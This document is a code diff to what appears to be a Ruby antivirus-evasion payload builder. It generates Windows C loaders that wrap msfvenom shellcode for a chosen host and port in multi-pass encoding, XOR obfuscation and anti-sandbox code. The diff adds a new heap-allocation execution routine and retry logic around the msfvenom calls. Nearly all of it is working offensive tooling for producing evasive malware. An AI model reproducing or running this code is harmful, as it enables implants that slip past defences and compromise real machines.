@@ -11,6 +11,7 @@ class PayloadMaker
     def initialize(shellcode,encoder=true)
         @shellcode = shellcode
         @encoder = encoder
+        #@platform = platform
     end
 
     def fake_includes
@@ -27,11 +28,11 @@ class PayloadMaker
 
     def random_memory
         # random memory size 
-        memory_size = random_number(@shellcode.length..100000)
+        memory_size = random_number(@shellcode.length..10000)
 
     end
 
-    def compile_function1
+    def compile_function1 #VirtualAllocEx
         shellcode = @shellcode
         rand_buf = random_funcname()
         rand_name1 = random_funcname()
@@ -41,11 +42,19 @@ class PayloadMaker
         encoded_code = shellcode
         decoded_code = ""
 
+        # if Encoder is set 
         encoded_code,decoded_code,rand_buf = Encoder::Xor.new(shellcode).generate if @encoder
-
+=begin        
+        encoded_code = encoder.encoded_code ||shellcode
+        decoded_code = encoder.decoded_code ||""
+        rand_buf = encoder.shellcode_name
+=end
+        # define variables
         shellcode.sub!('unsigned char buf[] = ',"unsigned char #{rand_buf}[] = ")
         string_mod_functions = ["LPVOID #{rand_name1};\n","HANDLE #{rand_name2};\n","SIZE_T #{rand_name3};\n","BOOL #{rand_name4} = FALSE;\n"].shuffle!.join()
 
+        # random memory size 
+        #memory_size = random_number(shellcode.length..100000)
 
         # add includes
         code = "#include <windows.h>\n"
@@ -54,7 +63,9 @@ class PayloadMaker
         # add shellcode 
         code << "\n" + encoded_code + "\n"
 
-  
+        # if Encoder is not set,add the raw shellcode 
+        #code << "\n" + shellcode + "\n"
+
         # main function
         code << "int main(){\n"
 
@@ -136,7 +147,59 @@ class PayloadMaker
         code << "}"
     end
 
-    
+    def compile_function3 # heap
+        shellcode = @shellcode
+        rand_buf = random_funcname()
+        rand_name1 = random_funcname()
+        rand_name2 = random_funcname()
+        encoded_code = shellcode
+        decoded_code = ""
+
+
+
+        # if Encoder is set 
+        encoded_code,decoded_code,rand_buf = Encoder::Xor.new(shellcode).generate if @encoder
+
+        # define variables
+        shellcode.sub!('unsigned char buf[] = ',"unsigned char #{rand_buf}[] = ")
+        string_mod_functions = ""
+       
+
+        
+
+        code = "#include <windows.h>\n"
+        code << fake_includes.join("\n")
+
+        
+        code << "\n" + encoded_code + "\n"
+
+        # if Encoder is not set,add the raw shellcode 
+
+        #code << "\n" + shellcode + "\n"
+
+        # main function
+        code << "int main(){\n"
+
+
+        # anti sandbox obfuscate code
+        output_status "Adding anti sandbox obfuscate code."
+        code << AntiSandBox::random_obfuscate
+
+        # decode shellcode
+        code <<  decoded_code + "\n"
+
+        # Declare variables
+        code << string_mod_functions
+
+        # run shellcode functions
+        code << "HANDLE #{rand_name1} = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, sizeof(#{rand_buf}),0);\n"
+        code << "LPVOID #{rand_name2} = (LPVOID)HeapAlloc(#{rand_name1},HEAP_ZERO_MEMORY,sizeof(#{rand_buf}));\n"
+        code << "memcpy(#{rand_name2},#{rand_buf},sizeof(#{rand_buf}));\n"
+        code << "(*(void(*)())#{rand_name2})();\n"
+        code << "return 0;\n"
+        code << "}"
+    end
+
     def compile_function4 # GetModuleHandle
         shellcode = @shellcode
         rand_buf = random_funcname()
@@ -192,6 +255,7 @@ class PayloadMaker
         code << "}"
     end
 
+
     def compile_function5 # CreateThread
         shellcode = @shellcode
         rand_buf = random_funcname()
@@ -244,8 +308,6 @@ class PayloadMaker
         code << "}"
     end
 
-
-
     def compile_random
         compile_functions = []
         self.methods.each {|x|
@@ -253,6 +315,7 @@ class PayloadMaker
         }
 
         output_status "Generating sample code."
+        #compile_function5
         send(compile_functions.sample)
     end
 
@@ -283,8 +346,20 @@ class MsfRunner
         encoder_array << encoder_array_all.sample
     end
 
+    def msf_check
+        msfstring = "msfvenom -h"
+
+        begin
+            stdin, stdout, stderr = Open3.popen3(msfstring)
+        rescue Exception => e
+            output_bad "Metasploit not found, please check or reinstall it."
+            exit
+        end
+
+    end
 
     def run
+        msf_check()
         encoder_array = get_encoder
         msfstring =  "msfvenom -p #{@payload}  lhost=#{@host}  lport=#{@port} #{@other} -f raw -e #{encoder_array[0]} -i #{random_number(10..15)} |"
         msfstring << "msfvenom -e #{encoder_array[1]} -a x86 --platform windows -f raw -i #{random_number(2..4)} |"
@@ -296,18 +371,38 @@ class MsfRunner
         output_status "Retrieve shellcode from metasploit.."
         output_line msfstring if @debug
         
+
         begin
-            stdin, stdout, stderr = Open3.popen3(msfstring) 
+            for i in 1..3
+                stdin, stdout, stderr = Open3.popen3(msfstring) 
+                shellcode = stdout.read
+                stderr = stderr.read
+                payload_size = stderr.lines[-2]
+
+                output_line shellcode if @debug
+                output_line stderr if @debug
+ 
+                unless shellcode.blank?
+                    if payload_size.include?("Payload size") && (payload_size.scan(/\d+/)[0].to_i > 300)
+                        break
+                    end
+                else
+                    output_warning "Generating code failed because of metasploit, retrying ..."
+                end
+            end
         rescue Exception => e
             output_bad "some error occured when running metasploit"
             output_bad e.message
             exit
         end
 
-        shellcode = stdout.read
+        
+        
 
         # payload size
-        output_line stderr.read.lines[-2]
+        output_line payload_size
+
+
 
         shellcode
     end
